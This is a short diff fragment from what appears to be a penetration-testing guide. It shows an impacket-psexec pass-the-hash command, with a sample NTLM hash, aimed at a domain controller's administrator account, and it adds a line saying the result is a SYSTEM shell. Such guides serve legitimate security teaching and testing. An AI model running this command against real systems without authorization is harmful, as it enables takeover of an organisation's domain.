@@ -5865,6 +5865,8 @@ impacket-psexec -hashes :fd02e525dd676fd8ca04e200d265f20c 'administrator@'<DC01_
 # C:\Windows\system32>
 ```
 
+**Result:** You’ll receive a SYSTEM shell on the domain controller.
+
 </details>
 
 <details>
